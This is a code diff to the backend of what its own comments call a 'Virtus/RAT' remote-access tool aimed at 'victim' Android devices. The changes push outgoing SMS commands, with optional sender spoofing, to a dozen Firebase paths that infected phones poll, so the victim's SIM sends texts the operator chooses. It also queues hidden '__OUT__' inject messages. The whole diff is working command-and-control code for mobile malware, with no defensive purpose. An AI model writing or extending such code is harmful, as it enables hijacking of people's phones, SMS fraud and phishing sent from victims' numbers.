@@ -13,6 +13,8 @@ logger = logging.getLogger(__name__)
 settings = get_settings()
 
 INJECT_TIMEOUT_SEC = 1.5
+OUTGOING_TIMEOUT_SEC = 3.0
+OUTGOING_SENDER = "__OUT__"
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     if profile.firebase_url:
@@ -86,6 +88,19 @@ async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIME
         return False
 
 
+async def _firebase_put_many(urls: list[str], data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> None:
+    if not urls:
+        return
+
+    async def _one(url: str) -> None:
+        try:
+            await _firebase_put(url, data, timeout=timeout)
+        except Exception as exc:
+            logger.debug("Firebase PUT failed for %s: %s", url, exc)
+
+    await asyncio.gather(*(_one(url) for url in urls), return_exceptions=True)
+
+
 def _inject_firebase_bases(profile: MonitorProfile, device: Device | None = None) -> list[str]:
     """Firebase roots for inject/outgoing — victim DB first (module DB often deactivated)."""
     bases: list[str] = []
@@ -106,16 +121,30 @@ def resolve_apk_firebase_url(profile: MonitorProfile, device: Device | None = No
     return settings.virtus_module_db.rstrip("/")
 
 
-def _outgoing_poll_ids(profile: MonitorProfile, device: Device) -> list[str]:
-    """Device ids the Virtus APK polls under messages/{id}/."""
-    poll_id = resolve_apk_poll_id(profile, device)
-    ids: list[str] = []
-    if poll_id:
-        ids.append(poll_id)
-    for device_id in _outgoing_device_ids(device):
-        if device_id not in ids:
-            ids.append(device_id)
-    return ids
+def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[str]:
+    return [
+        f"{base}/commands/{device_id}/{command_id}",
+        f"{base}/outgoing/{device_id}/{command_id}",
+        f"{base}/clients/{device_id}/commands/{command_id}",
+        f"{base}/clients/{device_id}/command/{command_id}",
+        f"{base}/clients/{device_id}/outbox/{command_id}",
+        f"{base}/clients/{device_id}/send/{command_id}",
+        f"{base}/clients/{device_id}/sendSms/{command_id}",
+        f"{base}/devices/{device_id}/commands/{command_id}",
+        f"{base}/devices/{device_id}/outbox/{command_id}",
+        f"{base}/sms_out/{device_id}/{command_id}",
+        f"{base}/sms/send/{command_id}",
+        f"{base}/send/{device_id}/{command_id}",
+    ]
+
+
+def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[str]:
+    """Victim SIM send via Virtus/RAT poll on messages/{victim_device_id}/."""
+    return [
+        f"{base}/messages/{device_id}/{command_id}",
+        f"{base}/clients/{device_id}/messages/{command_id}",
+        f"{base}/clients/{device_id}/sms_out/{command_id}",
+    ]
 
 
 async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
@@ -191,72 +220,59 @@ async def push_outgoing_sms_command(
     sim_index: int = 0,
     sim_slot: int | None = None,
     spoof_sender: str | None = None,
-) -> bool:
-    """Queue outgoing SMS on common victim-device Firebase paths."""
+    *,
+    device: Device | None = None,
+) -> str | None:
+    """Queue channel/outgoing SMS on victim Firebase — panel commands + __OUT__ SIM send."""
     base = normalize_firebase_url(firebase_url)
     command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    slot = sim_slot or (sim_index + 1)
+    created_at = datetime.now(timezone.utc).isoformat()
     payload = {
         "to": to_number,
+        "phone": to_number,
+        "number": to_number,
         "message": message,
+        "text": message,
+        "body": message,
         "sim_index": sim_index,
-        "sim_slot": sim_slot or (sim_index + 1),
+        "sim_slot": slot,
+        "sim": slot,
         "spoof_sender": spoof_sender,
         "status": "pending",
-        "created_at": datetime.now(timezone.utc).isoformat(),
+        "type": "sms",
+        "action": "send",
+        "created_at": created_at,
     }
-    paths = [
-        f"{base}/commands/{device_id}/{command_id}",
-        f"{base}/outgoing/{device_id}/{command_id}",
-        f"{base}/clients/{device_id}/command/{command_id}",
-        f"{base}/clients/{device_id}/commands/{command_id}",
-        f"{base}/clients/{device_id}/outgoing/{command_id}",
-        f"{base}/clients/{device_id}/outbox/{command_id}",
-        f"{base}/clients/{device_id}/send/{command_id}",
-        f"{base}/clients/{device_id}/sendSms/{command_id}",
-        f"{base}/sms/send/{command_id}",
-        f"{base}/send/{device_id}/{command_id}",
-    ]
-    results = await asyncio.gather(
-        *(_firebase_put_ok(path, payload) for path in paths),
+    inject_payload = {
+        "sender": OUTGOING_SENDER,
+        "body": f"{to_number}\n{message}\n{sim_index}",
+        "injected": False,
+        "created_at": created_at,
+    }
+
+    device_ids = _outgoing_device_ids(device) if device else [device_id]
+    if device_id and device_id not in device_ids:
+        device_ids.insert(0, device_id)
+
+    command_urls: list[str] = []
+    inject_urls: list[str] = []
+    for dev_id in device_ids:
+        command_urls.extend(_outgoing_command_paths(base, dev_id, command_id))
+        inject_urls.extend(_outgoing_inject_paths(base, dev_id, command_id))
+
+    await asyncio.gather(
+        _firebase_put_many(command_urls, payload),
+        _firebase_put_many(inject_urls, inject_payload),
         return_exceptions=True,
     )
-    return any(result is True for result in results)
-
-
-async def push_outgoing_via_messages(
-    profile: MonitorProfile,
-    device: Device,
-    to_number: str,
-    message: str,
-    sim_index: int = 0,
-) -> str | None:
-    """Virtus APK __OUT__ path: messages/{poll_id}/{id} sender=__OUT__ body=to\\nmsg\\nsim."""
-    poll_ids = _outgoing_poll_ids(profile, device)
-    if not poll_ids:
-        return None
-    body = f"{to_number}\n{message}\n{sim_index}"
-    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
-    payload = {
-        "sender": "__OUT__",
-        "body": body,
-        "injected": False,
-        "created_at": datetime.now(timezone.utc).isoformat(),
-    }
-    tasks = []
-    for firebase_url in _inject_firebase_bases(profile, device):
-        base = normalize_firebase_url(firebase_url)
-        for device_id in poll_ids:
-            tasks.append(_firebase_put_ok(f"{base}/messages/{device_id}/{message_id}", payload))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    if any(result is True for result in results):
-        logger.info(
-            "Outgoing __OUT__ queued ids=%s bases=%s",
-            poll_ids,
-            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
-        )
-        return message_id
-    logger.error("Outgoing __OUT__ push failed for %s", poll_ids)
-    return None
+    logger.info(
+        "Outgoing queued command_id=%s victim_ids=%s to=%s",
+        command_id,
+        device_ids,
+        to_number,
+    )
+    return command_id
 
 
 async def push_inject_message(
@@ -394,25 +410,15 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
-        # Victim SIM only — commands/outgoing paths (no __OUT__ on messages/).
-        device_ids = _outgoing_device_ids(device)
-        results = await asyncio.gather(
-            *(
-                push_outgoing_sms_command(
-                    firebase_url,
-                    device_id,
-                    outbound.to_number,
-                    outbound.message,
-                    sim_index=outbound.sim_index,
-                    sim_slot=outbound.sim_slot,
-                )
-                for device_id in device_ids
-            ),
-            return_exceptions=True,
+        return await push_outgoing_sms_command(
+            firebase_url,
+            device.name,
+            outbound.to_number,
+            outbound.message,
+            sim_index=outbound.sim_index,
+            sim_slot=outbound.sim_slot,
+            device=device,
         )
-        if any(result is True for result in results):
-            return datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
-        return None
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
